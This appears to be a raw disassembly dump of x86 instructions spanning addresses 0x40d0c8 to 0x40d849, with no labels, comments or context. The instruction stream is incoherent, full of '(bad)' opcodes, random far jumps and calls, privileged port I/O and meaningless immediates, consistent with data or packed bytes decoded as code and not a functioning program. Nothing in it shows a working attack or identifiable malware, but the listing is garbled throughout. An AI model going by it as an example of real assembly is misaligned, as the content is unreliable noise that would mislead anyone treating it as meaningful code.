  40d0c8:	aas    
  40d0c9:	pop    ss
  40d0ca:	push   0xffffffd3
  40d0cc:	push   ecx
  40d0cd:	or     eax,0x24c6d978
  40d0d2:	cmc    
  40d0d3:	dec    edx
  40d0d4:	sub    eax,0x833fbd05
  40d0d9:	out    0x46,eax
  40d0db:	cmp    eax,0x39cb0ba6
  40d0e0:	add    ch,BYTE PTR [edx]
  40d0e2:	test   al,0xe9
  40d0e4:	gs stc 
  40d0e6:	xchg   BYTE PTR ss:[ebp-0x27],dl
  40d0ea:	sub    cl,BYTE PTR [ebp-0x30b70600]
  40d0f0:	cmp    eax,0xd1282a37
  40d0f5:	cmp    BYTE PTR es:[esi],dh
  40d0f8:	push   ecx
  40d0f9:	xchg   ebp,eax
  40d0fa:	and    BYTE PTR [eax+0x1248a81d],bh
  40d100:	aam    0x61
  40d102:	shr    DWORD PTR [ebx-0x439323e2],0xae
  40d109:	xlat   BYTE PTR ds:[ebx]
  40d10a:	lods   al,BYTE PTR ds:[esi]
  40d10b:	push   esp
  40d10c:	clc    
  40d10d:	ja     0x40d0e3
  40d10f:	call   0x2c62850d
  40d114:	push   esp
  40d115:	inc    ecx
  40d116:	retf   
  40d117:	add    BYTE PTR [edi],dh
  40d119:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d11a:	push   ebx
  40d11b:	scas   eax,DWORD PTR es:[edi]
  40d11c:	push   0x892bb7b3
  40d121:	jae    0x40d12e
  40d123:	aas    
  40d124:	xor    DWORD PTR [ebx-0x4a76e9a7],ebp
  40d12a:	div    DWORD PTR [edi-0x18]
  40d12d:	jl     0x40d0fc
  40d12f:	in     al,0x57
  40d131:	xchg   esp,eax
  40d132:	jge    0x40d0b5
  40d134:	loope  0x40d0f0
  40d136:	into   
  40d137:	rcl    cl,cl
  40d139:	ret    
  40d13a:	mov    edx,0x653b6fbf
  40d13f:	jo     0x40d11d
  40d141:	mov    ecx,0x6302cbd9
  40d146:	dec    eax
  40d147:	add    cl,BYTE PTR [ebp+0x3c]
  40d14a:	mov    ah,0xdf
  40d14c:	pop    ss
  40d14d:	mul    BYTE PTR [ebp-0x7a]
  40d150:	int    0xb9
  40d152:	cmp    eax,edx
  40d154:	sub    BYTE PTR [edi+0x6f3df97f],dh
  40d15a:	push   esp
  40d15b:	mov    edx,0x49b8c8c1
  40d160:	fisub  DWORD PTR [ecx+0x4605763]
  40d166:	js     0x40d11f
  40d168:	ins    DWORD PTR es:[edi],dx
  40d169:	in     eax,0x30
  40d16b:	add    BYTE PTR [ebx-0x67efa4c],al
  40d171:	int3   
  40d172:	push   ds
  40d173:	mov    ebp,DWORD PTR [ecx+0x22]
  40d176:	cli    
  40d177:	aad    0xa0
  40d179:	into   
  40d17a:	sub    dh,BYTE PTR [ecx+0x755b7bab]
  40d180:	sbb    ch,cl
  40d182:	jnp    0x40d18f
  40d184:	aam    0x21
  40d186:	xchg   BYTE PTR [eax],dl
  40d188:	jge    0x40d1f0
  40d18a:	retf   
  40d18b:	lahf   
  40d18c:	push   0x99528062
  40d191:	cli    
  40d192:	retf   
  40d193:	arpl   WORD PTR [edx+0x1e],bp
  40d196:	call   0x6f08:0x6cba1268
  40d19d:	mov    esp,0x2d6d095d
  40d1a2:	or     ecx,edi
  40d1a4:	mov    al,BYTE PTR [eax]
  40d1a6:	gs stc 
  40d1a8:	sub    BYTE PTR [edi+0x2f5a4eb2],ch
  40d1ae:	push   ebp
  40d1af:	cmp    BYTE PTR [edi],0x95
  40d1b2:	dec    esi
  40d1b3:	xchg   ebx,eax
  40d1b4:	and    eax,DWORD PTR [edi+0x248cc662]
  40d1ba:	jns    0x40d1bc
  40d1bc:	out    dx,eax
  40d1bd:	mov    ds:0x1aeb9e26,al
  40d1c2:	cdq    
  40d1c3:	jo     0x40d189
  40d1c5:	xchg   DWORD PTR [ecx],edi
  40d1c7:	pusha  
  40d1c8:	push   es
  40d1c9:	sbb    al,BYTE PTR [ecx-0x6a]
  40d1cc:	je     0x40d1e6
  40d1ce:	mov    eax,0x6ba42c55
  40d1d3:	mov    eax,ds:0x60ac5345
  40d1d8:	cmp    ebp,ebx
  40d1da:	sbb    eax,0xfdca5321
  40d1df:	into   
  40d1e0:	and    ch,ch
  40d1e2:	fcmovnu st,st(0)
  40d1e4:	stos   DWORD PTR es:[edi],eax
  40d1e5:	mov    ecx,0x6a18768
  40d1ea:	and    bh,BYTE PTR [ebx+0x6d]
  40d1ed:	sbb    BYTE PTR [edx+0x70],ah
  40d1f0:	outs   dx,DWORD PTR ds:[esi]
  40d1f1:	dec    edx
  40d1f2:	shl    DWORD PTR [ecx-0x23f9c380],cl
  40d1f8:	cmc    
  40d1f9:	sub    eax,0xfcca623d
  40d1fe:	inc    edi
  40d1ff:	push   0xffffff97
  40d201:	pop    eax
  40d202:	out    dx,eax
  40d203:	push   esi
  40d204:	pop    es
  40d205:	jno    0x40d221
  40d207:	xor    edx,DWORD PTR [eax+0x2a]
  40d20a:	sub    eax,0xe3bf53f9
  40d20f:	xchg   ebp,eax
  40d210:	pop    ss
  40d211:	retf   0x943b
  40d214:	mov    esi,DWORD PTR [esp+ebx*1-0x17]
  40d218:	cli    
  40d219:	push   edi
  40d21a:	out    0x13,eax
  40d21c:	mov    ch,0xd5
  40d21e:	call   0x92c2:0xbe7507f3
  40d225:	inc    ebx
  40d226:	nop
  40d227:	shr    DWORD PTR [ebp-0x26],cl
  40d22a:	sub    ebx,0xffffffa6
  40d22d:	mov    dh,0xb
  40d22f:	stos   DWORD PTR es:[edi],eax
  40d230:	(bad)  
  40d231:	out    dx,al
  40d232:	jns    0x40d223
  40d234:	adc    esp,esp
  40d236:	mov    ds:0xd43f7673,al
  40d23b:	fisubr DWORD PTR [ebx+0x2f]
  40d23e:	dec    esi
  40d23f:	cmp    ch,dh
  40d241:	jno    0x40d28f
  40d243:	pusha  
  40d244:	mov    ds:0xa6f81b39,al
  40d249:	int    0x67
  40d24b:	test   al,0x67
  40d24d:	cmc    
  40d24e:	dec    esi
  40d24f:	push   ebx
  40d250:	mov    al,ds:0x4e8431d4
  40d255:	sub    bl,BYTE PTR [ecx-0x14]
  40d258:	xor    eax,0x897f7716
  40d25d:	mov    ecx,0xbed9dfb3
  40d262:	hlt    
  40d263:	mov    dh,0xbe
  40d265:	(bad)  
  40d266:	push   esi
  40d267:	push   sp
  40d269:	mov    ebx,0xb4d79ae4
  40d26e:	jae    0x40d288
  40d270:	xor    eax,0x5dec0e57
  40d275:	outs   dx,BYTE PTR ds:[esi]
  40d276:	mov    ebp,0x66236030
  40d27b:	xor    DWORD PTR [esi+0x1c84b843],esp
  40d281:	push   DWORD PTR [edx]
  40d283:	xchg   esp,eax
  40d284:	shl    edx,cl
  40d286:	stos   BYTE PTR es:[edi],al
  40d287:	test   al,0x88
  40d289:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d28a:	test   DWORD PTR [edi-0x72001dbc],ebx
  40d290:	fiadd  WORD PTR [ecx+0x45]
  40d293:	retf   
  40d294:	jge    0x40d225
  40d296:	test   ebx,edi
  40d298:	dec    eax
  40d299:	das    
  40d29a:	sub    eax,0x147ea668
  40d29f:	bound  esp,QWORD PTR [esi-0x4771cc12]
  40d2a5:	test   eax,0xb3c7e582
  40d2aa:	outs   dx,DWORD PTR ds:[esi]
  40d2ab:	fcom   st(4)
  40d2ad:	(bad)  
  40d2ae:	mov    eax,ds:0xfb564070
  40d2b3:	sbb    ah,ch
  40d2b5:	(bad)  
  40d2b6:	and    ah,ch
  40d2b8:	mov    ebx,0x778206a
  40d2bd:	out    0xb7,al
  40d2bf:	lds    ebx,FWORD PTR [edi]
  40d2c1:	arpl   WORD PTR [esi-0x14],si
  40d2c4:	pusha  
  40d2c5:	retf   
  40d2c6:	xor    eax,0xa3b2dfdc
  40d2cb:	ins    BYTE PTR es:[edi],dx
  40d2cc:	ds ds and eax,0xac0f9d1b
  40d2d3:	cmc    
  40d2d4:	inc    edx
  40d2d5:	adc    ah,BYTE PTR [esp+ebx*1-0x77d8ba8e]
  40d2dc:	inc    BYTE PTR ss:[ebx+0x3c58093e]
  40d2e3:	sahf   
  40d2e4:	cli    
  40d2e5:	cmp    esi,DWORD PTR [edx]
  40d2e7:	fmul   QWORD PTR [ebp-0x7ce8de13]
  40d2ed:	sub    al,0x39
  40d2ef:	inc    eax
  40d2f0:	inc    esp
  40d2f1:	mov    ebx,DWORD PTR [ecx]
  40d2f3:	adc    bl,BYTE PTR [eax+ebx*1+0x28e9476a]
  40d2fa:	fisub  WORD PTR [ecx]
  40d2fc:	out    0xbe,eax
  40d2fe:	sbb    edx,DWORD PTR [esi]
  40d300:	xor    bl,BYTE PTR [esi]
  40d302:	add    BYTE PTR [esi+0x1ff95c58],0xfd
  40d309:	test   BYTE PTR [eax],ah
  40d30b:	repnz lahf 
  40d30d:	sahf   
  40d30e:	mov    ebx,DWORD PTR [ebx]
  40d310:	xchg   ebp,eax
  40d311:	rcr    BYTE PTR [ecx],0xdf
  40d314:	mov    DWORD PTR [eax+eax*1-0x6880432e],esi
  40d31b:	mov    ds:0xfa14378e,al
  40d320:	mov    eax,ds:0xfb5539cb
  40d325:	mov    ecx,0xb77a4ed3
  40d32a:	das    
  40d32b:	dec    esi
  40d32c:	int    0xea
  40d32e:	pop    es
  40d32f:	fiadd  DWORD PTR [ecx+0x45]
  40d332:	jp     0x40d319
  40d334:	cmp    ecx,DWORD PTR [ebx]
  40d336:	dec    ebp
  40d337:	fdivr  QWORD PTR [edx+edi*2]
  40d33a:	pop    esp
  40d33b:	into   
  40d33c:	mov    esi,0xb3dd80a9
  40d341:	and    cl,dh
  40d343:	fisttp QWORD PTR [ecx+0x42da8e4d]
  40d349:	mov    ds:0xaf2d2a45,al
  40d34e:	dec    ebp
  40d34f:	lahf   
  40d350:	and    ebp,DWORD PTR [edi+esi*4+0x17748040]
  40d357:	xor    DWORD PTR [ecx-0x437c390a],ebp
  40d35d:	outs   dx,BYTE PTR ds:[esi]
  40d35e:	outs   dx,DWORD PTR ds:[esi]
  40d35f:	push   ebp
  40d360:	bound  ebp,QWORD PTR [ecx+ecx*1-0x484ac984]
  40d367:	stos   BYTE PTR es:[edi],al
  40d368:	jb     0x40d3c5
  40d36a:	mov    ah,0xaf
  40d36c:	ds cmp BYTE PTR cs:[ebx-0x20],dh
  40d371:	repnz icebp 
  40d373:	bsf    eax,DWORD PTR [ecx]
  40d376:	xor    al,0x4b
  40d378:	add    DWORD PTR [esi-0x3d],ebp
  40d37b:	jbe    0x40d33f
  40d37d:	xchg   DWORD PTR [edi+0x41],esi
  40d380:	mov    dl,0x81
  40d382:	mov    ecx,0x1b27f039
  40d387:	out    0x6b,eax
  40d389:	or     al,0x13
  40d38b:	jecxz  0x40d347
  40d38d:	cmp    eax,DWORD PTR [edi+0x16aa0537]
  40d393:	jo     0x40d337
  40d395:	out    0xb,al
  40d397:	in     eax,dx
  40d398:	xchg   edi,eax
  40d399:	rcr    BYTE PTR [edi+0x7c7cea8c],0x6f
  40d3a0:	jae    0x40d3b6
  40d3a2:	loope  0x40d3db
  40d3a4:	mov    al,ds:0xdc66d094
  40d3a9:	mov    eax,ds:0x75f2c7db
  40d3ae:	jnp    0x40d42a
  40d3b0:	retf   
  40d3b1:	nop
  40d3b2:	inc    esi
  40d3b3:	mov    eax,ds:0x2f5818f7
  40d3b8:	jo     0x40d3ac
  40d3ba:	pusha  
  40d3bb:	pop    esi
  40d3bc:	sub    bl,BYTE PTR ds:0xc33e28bf
  40d3c2:	add    cl,ch
  40d3c4:	daa    
  40d3c5:	pop    esp
  40d3c6:	in     al,dx
  40d3c7:	popf   
  40d3c8:	xchg   esi,eax
  40d3c9:	adc    DWORD PTR [eax+0x1d33be8c],0x3bac10
  40d3d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3d4:	mov    DWORD PTR [ebp+0x5598f2c],eax
  40d3da:	call   0xd681e9d9
  40d3df:	dec    ebp
  40d3e0:	(bad)  
  40d3e2:	in     eax,dx
  40d3e3:	mov    bl,0x78
  40d3e5:	inc    edx
  40d3e6:	cmp    esi,edi
  40d3e8:	push   ebx
  40d3e9:	in     al,0x38
  40d3eb:	jmp    FWORD PTR [edx+0x118eaeab]
  40d3f1:	jns    0x40d3fe
  40d3f3:	int    0xbe
  40d3f5:	jmp    0xb352746b
  40d3fa:	xchg   esp,eax
  40d3fb:	or     edi,DWORD PTR fs:[ecx+0x7777c4ea]
  40d402:	and    al,0xe3
  40d404:	dec    ebp
  40d405:	adc    eax,DWORD PTR [edx+ebx*8+0x47]
  40d409:	mov    bl,0x65
  40d40b:	in     al,0x56
  40d40d:	mov    cl,0xe
  40d40f:	mov    esp,DWORD PTR es:[edx-0x69dd9d95]
  40d416:	dec    edi
  40d417:	mov    BYTE PTR [edx+0x5d],bh
  40d41a:	cmp    eax,0xc4162550
  40d41f:	loop   0x40d45f
  40d421:	and    BYTE PTR [eax],bh
  40d423:	sub    DWORD PTR [edi+ecx*1+0x2e8ed613],esp
  40d42a:	ss adc eax,0x648ae754
  40d430:	cmp    BYTE PTR [edi+0x50d2d0a4],0xca
  40d437:	push   edi
  40d438:	add    al,0x92
  40d43a:	into   
  40d43b:	cwde   
  40d43c:	cli    
  40d43d:	inc    ecx
  40d43e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d43f:	adc    bl,BYTE PTR [edi+0x12]
  40d442:	fdivr  DWORD PTR [edx+0x2b96de4d]
  40d448:	ins    BYTE PTR es:[edi],dx
  40d449:	(bad)  
  40d44a:	and    DWORD PTR [edx],esp
  40d44c:	mov    ds:0xe2bd987c,eax
  40d451:	rcl    DWORD PTR [ecx+ebx*4],cl
  40d454:	or     ebp,edx
  40d456:	inc    ebx
  40d457:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d458:	shl    al,1
  40d45a:	in     al,0x47
  40d45c:	retf   0x3e33
  40d45f:	mov    al,0xc5
  40d461:	loopne 0x40d4d5
  40d463:	xor    DWORD PTR ds:[ebx+0x34c8ba78],esi
  40d46a:	imul   BYTE PTR [edi]
  40d46c:	sub    dh,BYTE PTR [ebx+0x52]
  40d46f:	shl    BYTE PTR [esi+0x45de246e],0x81
  40d476:	lods   eax,DWORD PTR ds:[esi]
  40d477:	mov    eax,ds:0xd7db1764
  40d47c:	jno    0x40d497
  40d47e:	aad    0xce
  40d480:	std    
  40d481:	cs ja  0x40d4c7
  40d484:	je     0x40d44a
  40d486:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d487:	dec    edx
  40d488:	shl    DWORD PTR [ebx+0x61],0x2e
  40d48c:	inc    esp
  40d48d:	ja     0x40d418
  40d48f:	push   edx
  40d490:	ror    BYTE PTR [ebp+0x7050953f],1
  40d496:	push   0x12e1acdb
  40d49b:	je     0x40d475
  40d49d:	in     eax,0x9a
  40d49f:	es dec ebx
  40d4a1:	xor    al,0x48
  40d4a3:	mov    eax,0x6d2e7c02
  40d4a8:	(bad)  
  40d4aa:	dec    edx
  40d4ab:	lock lock cmp cl,BYTE PTR [ecx-0x5b76d4]
  40d4b3:	cmp    bl,0xcb
  40d4b6:	cmp    eax,0xe75c1ee6
  40d4bb:	or     eax,DWORD PTR [ecx+0x38]
  40d4be:	pop    ebp
  40d4bf:	loopne 0x40d4d5
  40d4c1:	jns    0x40d4f7
  40d4c3:	or     eax,0xb9e16656
  40d4c8:	(bad)  
  40d4c9:	int    0x13
  40d4cb:	sub    edx,DWORD PTR [eax-0x6166fafa]
  40d4d1:	adc    al,0xf
  40d4d3:	cwde   
  40d4d4:	push   esp
  40d4d5:	pop    edx
  40d4d6:	pop    ds
  40d4d7:	mov    bh,0xf9
  40d4d9:	iret   
  40d4da:	out    dx,eax
  40d4db:	sub    ah,ah
  40d4dd:	push   ebx
  40d4de:	push   esi
  40d4df:	fild   WORD PTR [edx-0x4a]
  40d4e2:	pop    ebp
  40d4e3:	pop    ecx
  40d4e4:	repz aad 0x36
  40d4e7:	jno    0x40d4ff
  40d4e9:	cmp    DWORD PTR [edx+ecx*1+0xd],esi
  40d4ed:	(bad)  
  40d4ee:	mov    al,0xba
  40d4f0:	or     BYTE PTR [ebx],bl
  40d4f2:	dec    ecx
  40d4f3:	and    dl,BYTE PTR [bx+0x3a6a]
  40d4f8:	xchg   ebp,eax
  40d4f9:	das    
  40d4fa:	cmp    eax,0x24b7bd29
  40d4ff:	stos   DWORD PTR es:[edi],eax
  40d500:	das    
  40d501:	inc    edi
  40d502:	inc    edi
  40d503:	push   esi
  40d504:	inc    ebp
  40d505:	aaa    
  40d506:	aad    0x3c
  40d508:	push   edi
  40d509:	inc    edx
  40d50a:	and    ebx,eax
  40d50c:	inc    esp
  40d50d:	mov    bh,0xba
  40d50f:	inc    edx
  40d510:	dec    ebx
  40d511:	bound  esi,QWORD PTR [bx+si-0x5e]
  40d515:	add    DWORD PTR [ebp+edi*2-0x114a0fea],eax
  40d51c:	addr16 push cs
  40d51e:	push   eax
  40d51f:	daa    
  40d520:	dec    DWORD PTR [esi]
  40d522:	(bad)  
  40d523:	pop    ebx
  40d524:	stc    
  40d525:	mov    eax,0x40b349e5
  40d52a:	xlat   BYTE PTR ds:[ebx]
  40d52b:	aad    0x1
  40d52d:	mov    ds:0x15717956,al
  40d532:	sar    DWORD PTR [ebx+0x2b0dd564],0xd
  40d539:	push   esp
  40d53a:	out    dx,al
  40d53b:	mov    esi,0x29bcc8c1
  40d540:	and    DWORD PTR [ebp+0x15],0x3db307e2
  40d547:	int    0xad
  40d549:	and    al,0x3c
  40d54b:	ja     0x40d584
  40d54d:	cmp    BYTE PTR [edi+0x5d40d39a],ah
  40d553:	jp     0x40d544
  40d555:	push   0xa0bb6f1
  40d55a:	sahf   
  40d55b:	push   eax
  40d55c:	adc    eax,0x99f66227
  40d561:	outs   dx,DWORD PTR ds:[esi]
  40d562:	push   ebx
  40d563:	pushf  
  40d564:	dec    ecx
  40d565:	addr16 pop edi
  40d567:	ds dec ebx
  40d569:	jecxz  0x40d525
  40d56b:	jcxz   0x40d59e
  40d56e:	push   es
  40d56f:	mov    ebp,edi
  40d571:	push   ebp
  40d572:	xor    ecx,DWORD PTR [edx]
  40d574:	dec    esp
  40d575:	cmc    
  40d576:	mov    ah,0x2a
  40d578:	xchg   edi,eax
  40d579:	xchg   BYTE PTR [edx],al
  40d57b:	pusha  
  40d57c:	or     BYTE PTR [ebx+ebp*4+0x4b],dh
  40d580:	(bad)  
  40d581:	ja     0x40d5ef
  40d583:	or     al,ah
  40d585:	and    al,0x1c
  40d587:	inc    eax
  40d588:	dec    edx
  40d589:	sub    ch,bh
  40d58b:	and    eax,0x5fa529e0
  40d590:	pushf  
  40d591:	cld    
  40d592:	pusha  
  40d593:	into   
  40d594:	scas   al,BYTE PTR es:[edi]
  40d595:	mov    cl,0x6f
  40d597:	icebp  
  40d598:	xchg   ebx,eax
  40d599:	das    
  40d59a:	jle    0x40d613
  40d59c:	jle    0x40d5fb
  40d59e:	iret   
  40d59f:	aam    0x4a
  40d5a1:	fidivr DWORD PTR [eax]
  40d5a3:	jl     0x40d544
  40d5a5:	jmp    0xb26e:0x68739137
  40d5ac:	or     ch,bl
  40d5ae:	scas   al,BYTE PTR es:[edi]
  40d5af:	add    edx,DWORD PTR [edx-0x36cb560b]
  40d5b5:	or     al,0x30
  40d5b7:	in     al,dx
  40d5b8:	adc    BYTE PTR [esp+edx*8-0x73],dl
  40d5bc:	lds    esi,FWORD PTR [ecx+0x2c179590]
  40d5c2:	ins    DWORD PTR es:[edi],dx
  40d5c3:	add    BYTE PTR [esi+ecx*4-0xecaa061],dh
  40d5ca:	cld    
  40d5cb:	ret    0xf984
  40d5ce:	ret    
  40d5cf:	adc    al,0x3d
  40d5d1:	hlt    
  40d5d2:	inc    eax
  40d5d3:	pop    eax
  40d5d4:	or     ch,BYTE PTR [esi+edi*2]
  40d5d7:	pop    edi
  40d5d8:	adc    BYTE PTR [edx+0x136a83cc],0xc3
  40d5df:	inc    ebp
  40d5e0:	and    esi,DWORD PTR [eax-0x6c]
  40d5e3:	out    0xea,al
  40d5e5:	es enter 0xdfc3,0x62
  40d5ea:	and    ah,BYTE PTR [ecx+ecx*2]
  40d5ed:	outs   dx,BYTE PTR ds:[esi]
  40d5ee:	add    cl,BYTE PTR [eax-0x27a14161]
  40d5f4:	fwait
  40d5f5:	sbb    bh,BYTE PTR [edx]
  40d5f7:	stc    
  40d5f8:	sub    DWORD PTR [ecx-0x3fdeabd0],edi
  40d5fe:	inc    ecx
  40d5ff:	rcl    ebx,cl
  40d601:	add    bl,bh
  40d603:	jge    0x40d64c
  40d605:	sahf   
  40d606:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d607:	mov    eax,0x34297617
  40d60c:	cwde   
  40d60d:	adc    ebp,ecx
  40d60f:	stos   DWORD PTR es:[edi],eax
  40d610:	jecxz  0x40d68d
  40d612:	jmp    0x4294:0x2aa917a5
  40d619:	mov    ebp,0x5632fbbe
  40d61e:	aas    
  40d61f:	sahf   
  40d620:	out    dx,eax
  40d621:	retf   0xa2f9
  40d624:	mov    dh,0x59
  40d626:	popa   
  40d627:	push   edx
  40d628:	daa    
  40d629:	xchg   edx,eax
  40d62a:	fdivr  st,st(6)
  40d62c:	adc    DWORD PTR [edi+ebp*8-0xd],edx
  40d630:	loopne 0x40d6aa
  40d632:	popa   
  40d633:	fstp   TBYTE PTR [ebp-0x79]
  40d636:	mov    ch,0x16
  40d638:	(bad)  
  40d639:	inc    cx
  40d63b:	jp     0x40d635
  40d63d:	idiv   BYTE PTR [ebx+0x317b2f53]
  40d643:	jnp    0x40d5fe
  40d645:	jle    0x40d663
  40d647:	fisttp DWORD PTR ds:0xbd75e465
  40d64d:	mov    bh,0xbb
  40d64f:	or     al,0xef
  40d651:	inc    ecx
  40d652:	fdivp  st(2),st
  40d654:	js     0x40d65d
  40d656:	or     BYTE PTR [ecx+0x512376d5],0x32
  40d65d:	fimul  WORD PTR [esp+edx*2-0x4bcfb7fe]
  40d664:	(bad)
  40d669:	stos   DWORD PTR es:[edi],eax
  40d66a:	inc    eax
  40d66b:	inc    edx
  40d66c:	jmp    0x4a3a:0x27a5f1e3
  40d673:	inc    eax
  40d674:	(bad)  
  40d675:	rcr    BYTE PTR [ebp+0x1b658454],0x93
  40d67c:	or     eax,DWORD PTR [esi-0x5141a66a]
  40d682:	ror    BYTE PTR [esi+0x77],cl
  40d685:	loopne 0x40d69d
  40d687:	jg     0x40d65a
  40d689:	ins    BYTE PTR es:[edi],dx
  40d68a:	sub    DWORD PTR [ecx-0x58],edi
  40d68d:	js     0x40d6ea
  40d68f:	enter  0x81b8,0xd7
  40d693:	fmul   DWORD PTR [eax-0x215b49cd]
  40d699:	pop    edi
  40d69a:	cmp    BYTE PTR [ebx+0x56],0xb2
  40d69e:	xchg   ebx,eax
  40d69f:	aad    0x59
  40d6a1:	mov    cl,0xfe
  40d6a3:	push   esp
  40d6a5:	mov    ebx,0x14dfa4d0
  40d6aa:	fcmovnu st,st(6)
  40d6ac:	push   ebp
  40d6ad:	retf   0x7ed7
  40d6b0:	push   ecx
  40d6b1:	sub    DWORD PTR [esp+ebp*8+0x6af85dc9],edi
  40d6b8:	add    BYTE PTR [edx-0x6ff4c81f],ah
  40d6be:	out    0x56,al
  40d6c0:	pop    ebx
  40d6c1:	sbb    al,0xaf
  40d6c3:	pop    ds
  40d6c4:	sbb    al,0xd4
  40d6c6:	stos   BYTE PTR es:[edi],al
  40d6c7:	(bad)  
  40d6c8:	out    dx,eax
  40d6c9:	dec    eax
  40d6ca:	(bad)  
  40d6cc:	xchg   ecx,eax
  40d6cd:	jg     0x40d698
  40d6cf:	xchg   esp,eax
  40d6d0:	and    edi,eax
  40d6d2:	jmp    0x40d6ca
  40d6d4:	les    edi,FWORD PTR [esp+edi*4]
  40d6d7:	js     0x40d689
  40d6d9:	outs   dx,DWORD PTR ds:[esi]
  40d6da:	(bad)  
  40d6db:	push   cs
  40d6dc:	fwait
  40d6dd:	xor    ebp,0x78494ac1
  40d6e3:	out    0x5d,al
  40d6e5:	add    DWORD PTR [ecx],esp
  40d6e7:	rol    BYTE PTR [ecx+0x1a7668fd],0xdc
  40d6ee:	inc    ebx
  40d6ef:	arpl   WORD PTR [ecx],ax
  40d6f1:	iret   
  40d6f2:	mov    ch,0xb5
  40d6f4:	xor    eax,0xebb58cc
  40d6f9:	mov    eax,esi
  40d6fb:	xchg   ecx,eax
  40d6fc:	mov    ch,0x72
  40d6fe:	test   eax,0x6b0388b7
  40d703:	inc    eax
  40d704:	call   0x7f8e:0x7f18e8fa
  40d70b:	shl    al,1
  40d70d:	adc    DWORD PTR [edx],edx
  40d70f:	fwait
  40d710:	or     dh,BYTE PTR [eax-0x75]
  40d713:	dec    ebx
  40d714:	cmp    BYTE PTR [ebx],bh
  40d716:	inc    ecx
  40d717:	cwde   
  40d718:	retf   
  40d719:	ss mov eax,0x2d90d9e3
  40d71f:	pavgb  mm5,QWORD PTR es:[esp+ebx*8]
  40d724:	adc    DWORD PTR [edx],esi
  40d726:	mov    ecx,edi
  40d728:	in     al,0x75
  40d72a:	and    bl,dl
  40d72c:	xchg   esp,eax
  40d72d:	icebp  
  40d72e:	or     edx,DWORD PTR ds:0x6120f089
  40d734:	and    eax,0xe532fa9a
  40d739:	stos   DWORD PTR es:[edi],eax
  40d73a:	loopne 0x40d74f
  40d73c:	xor    al,0x38
  40d73e:	je     0x40d717
  40d740:	je     0x40d6e0
  40d742:	int    0xa2
  40d744:	fs pop esp
  40d746:	pop    edi
  40d747:	gs ja  0x40d75b
  40d74a:	inc    esp
  40d74b:	imul   ecx,DWORD PTR [esi-0x28c235f3],0xa90b4c4a
  40d755:	sub    DWORD PTR [esi],ecx
  40d757:	clc    
  40d758:	mov    edx,0x496d6bab
  40d75d:	mov    esi,0x53120f00
  40d762:	cs aas 
  40d764:	out    0x90,eax
  40d766:	xlat   BYTE PTR ds:[ebx]
  40d767:	xchg   ecx,eax
  40d768:	jnp    0x40d770
  40d76a:	or     al,0x24
  40d76c:	mov    DWORD PTR [esi+0x63],eax
  40d76f:	push   ebx
  40d770:	ds push ebp
  40d772:	or     al,0xa
  40d774:	pusha  
  40d775:	push   ebx
  40d776:	xchg   DWORD PTR es:[eax],eax
  40d779:	mov    cs,WORD PTR [eax]
  40d77b:	dec    eax
  40d77c:	(bad)  
  40d77d:	(bad)  
  40d77e:	out    dx,al
  40d77f:	push   ecx
  40d780:	je     0x40d767
  40d782:	loope  0x40d7cf
  40d784:	mov    esp,DWORD PTR [eax+0x6f]
  40d787:	pop    ecx
  40d788:	imul   edx,DWORD PTR [ecx+ebp*4],0x9fffae4e
  40d78f:	adc    al,0x41
  40d791:	inc    ebx
  40d792:	shl    DWORD PTR [esi+0x30],1
  40d795:	fs xor eax,0x521a260d
  40d79b:	and    ah,BYTE PTR [ebx-0x6b2a43e1]
  40d7a1:	in     al,0xc1
  40d7a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7a4:	test   eax,0x282c131e
  40d7a9:	and    ecx,eax
  40d7ab:	push   es
  40d7ac:	and    dl,BYTE PTR [edx-0x15]
  40d7af:	pop    ebx
  40d7b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d7b1:	out    dx,al
  40d7b2:	jmp    DWORD PTR [edx+0x6d72e1f8]
  40d7b8:	mov    bh,0x4c
  40d7ba:	int3   
  40d7bb:	icebp  
  40d7bc:	stc    
  40d7bd:	inc    eax
  40d7be:	and    al,BYTE PTR [ecx+0x1d]
  40d7c1:	jge    0x40d7df
  40d7c3:	ds jmp 0x74df:0xdab82c66
  40d7cb:	retf   
  40d7cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d7cd:	mov    bl,0xab
  40d7cf:	mov    bl,0x5c
  40d7d1:	cwde   
  40d7d2:	daa    
  40d7d3:	add    DWORD PTR [edx],0xffffff9b
  40d7d6:	in     eax,0x59
  40d7d8:	es repz cwde 
  40d7db:	loope  0x40d781
  40d7dd:	jae    0x40d7e1
  40d7df:	sub    bl,BYTE PTR [esi-0x6cb46d51]
  40d7e5:	dec    edx
  40d7e6:	mov    ch,0xb
  40d7e8:	adc    BYTE PTR [ebp+ebp*2+0x6fb71f4d],dl
  40d7ef:	cmp    esi,ecx
  40d7f1:	jns    0x40d821
  40d7f3:	(bad)  
  40d7f4:	sbb    esi,esi
  40d7f6:	jmp    0x81a8f65a
  40d7fb:	dec    ebx
  40d7fc:	or     DWORD PTR ds:0x74d52b3e,edx
  40d802:	xchg   BYTE PTR [esi],ah
  40d804:	push   esp
  40d805:	mov    es,esi
  40d807:	fnsave [ebp-0x58]
  40d80a:	jmp    0x59e19240
  40d80f:	test   al,0x22
  40d811:	pop    edx
  40d812:	jo     0x40d7d8
  40d814:	jmp    0xe20f:0x512e0de2
  40d81b:	je     0x40d846
  40d81d:	sbb    BYTE PTR [ebx-0xccb5a],al
  40d823:	ins    DWORD PTR es:[edi],dx
  40d824:	mov    ah,dl
  40d826:	cli    
  40d827:	clc    
  40d828:	xchg   esp,eax
  40d829:	fcmovne st,st(6)
  40d82b:	mov    edi,0x2b7e8410
  40d830:	dec    eax
  40d831:	xlat   BYTE PTR ds:[ebx]
  40d832:	call   FWORD PTR [edi+eax*2+0x4b]
  40d836:	mov    eax,ds:0x98163b89
  40d83b:	test   DWORD PTR [ecx-0x41b9c9c8],eax
  40d841:	enter  0x8481,0x5f
  40d845:	or     al,0x58
  40d847:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d848:	fwait
  40d849:	mov    DWORD PTR [ecx+eiz*2-0x35],ecx
